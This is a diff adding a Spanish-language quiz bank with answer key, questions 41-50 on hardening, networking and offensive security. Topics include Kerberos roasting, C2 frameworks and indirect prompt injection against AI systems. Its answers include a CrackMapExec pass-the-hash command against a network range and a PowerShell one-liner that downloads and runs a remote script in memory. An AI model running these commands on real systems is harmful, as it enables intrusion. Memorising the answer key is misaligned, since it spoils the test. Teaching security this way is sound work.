@@ -1,0 +1,63 @@
+# Banco de Preguntas - Parte 5 🎓
+
+### 📦 Bloque 5: Hardening y Redes (41-50)
+
+41. **¿Qué herramienta automatizada de hardening se enfoca en sistemas industriales basados en Linux?**
+    - [ ] OpenPLC.
+    - [X] OpenClaw.
+    - [ ] Pentagi.
+    - [ ] Wireshark.
+
+42. **¿Cuál es el comando de CrackMapExec para probar un hash NTLM contra un rango de red completo?**
+    - [ ] `crackmapexec smb IP -u user -p pass`
+    - [X] `crackmapexec smb 10.10.10.0/24 -u user -H HASH`
+    - [ ] `nmap -sC 10.10.10.0/24`
+    - [ ] `metasploit -p smb_login`
+
+43. **¿Qué vulnerabilidad de API permite a un atacante enviar múltiples parámetros no esperados para modificar propiedades del sistema, como cambiar el rol de usuario a "admin"?**
+    - [ ] BOLA.
+    - [X] Mass Assignment (Asignación Masiva).
+    - [ ] Inyección NoSQL.
+    - [ ] Falta de cifrado en reposo.
+
+44. **¿Cuál es el propósito del "Data Diode" en entornos industriales?**
+    - [ ] Actuar como un switch de alta velocidad para protocolos Modbus.
+    - [X] Permitir el flujo de datos en una sola dirección (típicamente de OT a IT), eliminando la bidireccionalidad del ataque.
+    - [ ] Cifrar todas las comunicaciones entre PLCs.
+    - [ ] Detectar intrusiones mediante análisis de firmas.
+
+45. **¿Qué técnica de exfiltración utiliza peticiones DNS para enviar datos fuera de una red protegida por firewalls estrictos?**
+    - [ ] HTTP Exfiltration.
+    - [X] DNS Tunneling.
+    - [ ] ICMP Redirect.
+    - [ ] SMB Exfiltration.
+
+46. **¿Qué vulnerabilidad OWASP se refiere a la presencia de componentes de software (librerías, frameworks) con fallos conocidos y no parcheados?**
+    - [ ] A01: Broken Access Control.
+    - [X] A06: Vulnerable and Outdated Components.
+    - [ ] A09: Security Logging Failures.
+    - [ ] A04: Insecure Design.
+
+47. **¿Qué comando de PowerShell se utiliza para descargar y ejecutar un script directamente en memoria (Fileless execution)?**
+    - [ ] `Invoke-Item script.ps1`
+    - [X] `IEX (New-Object Net.WebClient).DownloadString('URL')`
+    - [ ] `Start-Process powershell.exe script.ps1`
+    - [ ] `Copy-Item URL -Destination C:\`
+
+48. **En el ataque "AS-REP Roasting", ¿qué condición debe cumplir un usuario para ser vulnerable?**
+    - [ ] Debe ser miembro del grupo Administradores de Dominio.
+    - [X] Debe tener deshabilitada la "Pre-autenticación de Kerberos".
+    - [ ] Debe tener una contraseña de menos de 8 caracteres.
+    - [ ] Debe haber iniciado sesión en un servidor comprometido.
+
+49. **¿Qué herramienta de C2 (Command and Control) es moderna, está escrita en Go y utiliza mTLS para sus comunicaciones?**
+    - [ ] Metasploit.
+    - [X] Sliver.
+    - [ ] Empire.
+    - [ ] Netcat.
+
+50. **El ataque "Prompt Injection Indirecto" ocurre cuando:**
+    - [ ] El atacante escribe directamente en el chat de la IA.
+    - [X] La IA procesa una fuente externa (como una web o email) que contiene instrucciones maliciosas ocultas.
+    - [ ] El modelo sufre un ataque de denegación de servicio.
+    - [ ] El administrador cambia el System Prompt por error.
